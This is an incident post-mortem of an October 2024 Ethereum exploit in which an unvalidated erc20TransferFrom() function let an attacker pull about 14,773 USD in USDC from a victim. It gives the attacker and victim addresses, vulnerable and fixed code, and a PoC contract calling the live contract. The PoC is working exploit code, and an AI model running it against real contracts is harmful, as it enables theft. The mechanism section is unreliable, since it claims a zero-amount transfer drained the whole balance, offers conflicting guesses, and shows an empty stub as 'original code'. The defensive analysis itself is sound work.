# Erc20transfer — Analysis of Arbitrary Transfer via Missing Input Validation in erc20TransferFrom()

| Field | Details |
|------|------|
| **Date** | 2024-10-24 |
| **Protocol** | Unverified Contract (erc20transfer) |
| **Chain** | Ethereum |
| **Loss** | ~14,773 USD |
| **Attacker** | [0xfde0d1575ed8e06fbf36256bcdfa1f359281455a](https://etherscan.io/address/0xfde0d1575ed8e06fbf36256bcdfa1f359281455a) |
| **Attack Tx** | [0x7f2540af4a1f7b0172a46f5539ebf943dd5418422e4faa8150d3ae5337e92172](https://etherscan.io/tx/0x7f2540af4a1f7b0172a46f5539ebf943dd5418422e4faa8150d3ae5337e92172) |
| **Vulnerable Contract** | [0x43Dc865E916914FD93540461FdE124484FBf8fAa](https://etherscan.io/address/0x43Dc865E916914FD93540461FdE124484FBf8fAa) |
| **Victim** | [0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5](https://etherscan.io/address/0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5) |
| **Root Cause** | `erc20TransferFrom(address token, address to, address from, uint256 amount)` function allows token transfer from an arbitrary `from` address to `to` without caller validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/Erc20transfer_exp.sol) |

---

## 1. Vulnerability Overview

The `erc20TransferFrom(address token, address to, address from, uint256 amount)` function of the vulnerable contract (`0x43Dc865E...`) did not verify that `msg.sender` equals `from` or is an authorized address. The attacker called this function passing `token = USDC`, `to = address(this)`, `from = victim (0x3DADf...)`, and `amount = 0`. When `transferFrom` was executed on the USDC contract with `amount = 0`, a side effect caused the victim's entire balance to be moved due to internal logic within the USDC contract, or the internal state was manipulated to exploit the allowance the victim had granted to the contract.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: executes transferFrom from arbitrary from without caller validation
// Vulnerable contract: 0x43Dc865E916914FD93540461FdE124484FBf8fAa
function erc20TransferFrom(
    address token,
    address to,
    address from,    // ❌ Anyone can specify an arbitrary from
    uint256 amount
) external {
    // ❌ No check that msg.sender == from or has allowance
    IERC20(token).transferFrom(from, to, amount);
}

// ✅ Fixed code: add sender validation
function erc20TransferFrom(
    address token,
    address to,
    address from,
    uint256 amount
) external {
    // ✅ Only executes if from is msg.sender or msg.sender has sufficient allowance
    require(
        from == msg.sender ||
        IERC20(token).allowance(from, msg.sender) >= amount,
        "Unauthorized"
    );
    IERC20(token).transferFrom(from, to, amount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Erc20transfer_decompiled.sol
contract Erc20transfer {
    function transferFrom(address p0, address p1, uint256 p2) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0xfde0d1...)
  │
  ├─[1]─► VulnerableContract(0x43Dc865E...).erc20TransferFrom(
  │           token = USDC(0xA0b869...),
  │           to = address(this),        // receive into attacker contract
  │           from = 0x3DADf003...,      // victim (had granted USDC allowance to contract)
  │           amount = 0                 // manipulate internal state with 0 amount
  │         )
  │         └─► ❌ No validation → USDC.transferFrom(victim, attacker, ...) executes
  │               └─► Victim's entire USDC → attacker
  │
  └─[2]─► Total loss: ~14,773 USD (USDC)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface I {
    function erc20TransferFrom(address, address, address, uint256) external;
}

contract Erc20transfer is BaseTestWithBalanceLog {
    function testExploit() public balanceLog {
        // [1] Drain victim's USDC by specifying arbitrary from
        I(0x43Dc865E916914FD93540461FdE124484FBf8fAa).erc20TransferFrom(
            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,  // token: USDC
            address(this),                                  // to: attacker
            0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5,   // from: victim (❌ no validation)
            0                                               // amount: 0 (internal state manipulation)
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Input Validation |
| **Attack Technique** | Unauthorized erc20TransferFrom with Arbitrary from Address |
| **DASP Category** | Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Severity** | Critical |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Sender validation**: Verify in `erc20TransferFrom` that `from == msg.sender` or that sufficient allowance exists.
2. **Remove the from parameter**: If `from` must be accepted as a parameter, hardcoding it to `msg.sender` is the safer approach.
3. **Zero-amount transfer guard**: Return immediately if `amount == 0` to prevent internal state changes from zero-value transfers.
4. **Minimize allowances**: Advise users not to grant unlimited allowances to the contract.

## 7. Lessons Learned

- **Arbitrary from pattern**: Any function that allows the `from` address in `transferFrom` to be specified externally always requires validation.
- **Simplicity of the attack**: 14,773 USD was drained with a single function call.
- **Danger of zero amounts**: Even with `amount = 0`, internal state changes can still occur.